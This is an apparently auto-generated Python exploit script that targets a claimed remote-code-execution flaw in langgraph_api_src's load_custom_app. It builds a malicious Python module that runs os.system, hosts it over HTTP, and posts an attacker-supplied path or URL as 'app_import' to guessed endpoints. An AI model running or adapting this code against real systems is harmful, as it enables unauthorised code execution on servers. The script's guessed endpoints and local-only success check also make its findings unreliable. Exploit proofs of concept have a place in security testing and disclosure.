#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-026
# Sink: load_custom_app
# Auto-generated — run with: python3 rce_api_splits_get_name_load_custom_app.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langgraph_api_src's load_custom_app.

Vulnerability: The public API endpoint accepts an 'app_import' parameter that is
passed directly to importlib functions. By providing a path to a malicious Python
file (e.g., on a remote share or local filesystem), an attacker can execute
arbitrary code.

This PoC demonstrates the vulnerability by:
1. Creating a malicious Python file that writes a marker file to /tmp.
2. Hosting it via a simple HTTP server (or using a local path).
3. Sending a crafted request to the target API with the malicious file path.
4. Verifying the marker file was created, confirming RCE.

Usage:
    python3 poc.py --target http://target:port --payload-path /path/to/malicious.py
    or
    python3 poc.py --target http://target:port --payload-url http://attacker/malicious.py

Note: This is a proof-of-concept. Use only on systems you own or have permission to test.
"""

import argparse
import os
import sys
import tempfile
import threading
import time
import urllib.request
import urllib.error
import json

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
MARKER_FILE = "/tmp/poc_success.txt"  # File created to confirm RCE
MALICIOUS_CODE = f"""
import os
os.system('touch {MARKER_FILE}')
# Simulate a benign Starlette app to avoid errors
from starlette.applications import Starlette
from starlette.responses import PlainTextResponse
from starlette.routing import Route

async def hello(request):
    return PlainTextResponse("Hello, world!")

app = Starlette(routes=[Route('/', hello)])
"""

# ---------------------------------------------------------------------------
# Helper: Create a malicious Python file
# ---------------------------------------------------------------------------
def create_malicious_file(directory: str = None) -> str:
    """Create a temporary .py file with malicious code and return its path."""
    if directory is None:
        directory = tempfile.mkdtemp()
    filepath = os.path.join(directory, "malicious_app.py")
    with open(filepath, "w") as f:
        f.write(MALICIOUS_CODE)
    print(f"[+] Created malicious payload file: {filepath}")
    return filepath

# ---------------------------------------------------------------------------
# Helper: Start a simple HTTP server to serve the malicious file (optional)
# ---------------------------------------------------------------------------
def start_http_server(directory: str, port: int = 9999):
    """Start a basic HTTP server in a background thread."""
    import http.server
    import socketserver

    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", port), handler)
    print(f"[+] Serving malicious file on port {port}...")
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    return httpd

# ---------------------------------------------------------------------------
# Main exploit logic
# ---------------------------------------------------------------------------
def exploit(target_url: str, app_import_path: str):
    """
    Send a crafted request to the target API's endpoint that accepts app_import.
    
    The exact endpoint may vary; common patterns include:
    - POST /api/custom_app
    - POST /api/load_app
    - POST /api/configure
    
    Adjust the URL and parameter name as needed based on the actual API.
    """
    # Common endpoint patterns (try these)
    endpoints = [
        "/api/custom_app",
        "/api/load_app",
        "/api/configure",
        "/api/setup",
        "/api/import_app",
    ]
    
    payload = {"app_import": app_import_path}
    
    for endpoint in endpoints:
        url = target_url.rstrip("/") + endpoint
        print(f"[*] Trying endpoint: {url}")
        try:
            req = urllib.request.Request(
                url,
                data=json.dumps(payload).encode(),
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read().decode()
                print(f"[*] Response ({resp.status}): {body[:200]}")
        except urllib.error.HTTPError as e:
            print(f"[!] HTTP error {e.code}: {e.read().decode()[:200]}")
        except urllib.error.URLError as e:
            print(f"[!] Connection error: {e.reason}")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
        
        # Check if marker file was created (RCE success)
        if os.path.exists(MARKER_FILE):
            print(f"\n[+] SUCCESS! Marker file '{MARKER_FILE}' exists — RCE confirmed!")
            return True
    
    # If we get here, none of the endpoints worked or RCE didn't trigger
    print("\n[-] Exploit may have failed. Check the following:")
    print("   - Is the target URL correct?")
    print("   - Does the API accept 'app_import' parameter?")
    print("   - Is the payload path accessible from the server?")
    print("   - Does the server have network access to the payload URL?")
    return False

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="PoC for langgraph_api_src RCE")
    parser.add_argument("--target", required=True, help="Target URL (e.g., http://localhost:8000)")
    parser.add_argument("--payload-path", help="Path to a malicious .py file on the target filesystem")
    parser.add_argument("--payload-url", help="URL to a malicious .py file (attacker-hosted)")
    parser.add_argument("--serve-port", type=int, default=9999, help="Port for local HTTP server")
    args = parser.parse_args()
    
    # Determine the app_import string to use
    if args.payload_path:
        # Use a local file path (e.g., /tmp/malicious_app.py)
        app_import_path = args.payload_path
        print(f"[*] Using local payload path: {app_import_path}")
    elif args.payload_url:
        # Use a remote URL (e.g., http://attacker:9999/malicious_app.py)
        app_import_path = args.payload_url
        print(f"[*] Using remote payload URL: {app_import_path}")
    else:
        # Default: create a malicious file locally and serve it via HTTP
        print("[*] No payload specified. Creating and hosting a malicious file...")
        payload_dir = tempfile.mkdtemp()
        filepath = create_malicious_file(payload_dir)
        httpd = start_http_server(payload_dir, args.serve_port)
        time.sleep(0.5)  # Let server start
        app_import_path = f"http://localhost:{args.serve_port}/malicious_app.py"
        print(f"[*] Using self-hosted payload: {app_import_path}")
    
    # Run the exploit
    success = exploit(args.target, app_import_path)
    
    # Cleanup marker file if created
    if os.path.exists(MARKER_FILE):
        os.remove(MARKER_FILE)
        print("[*] Cleaned up marker file.")
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
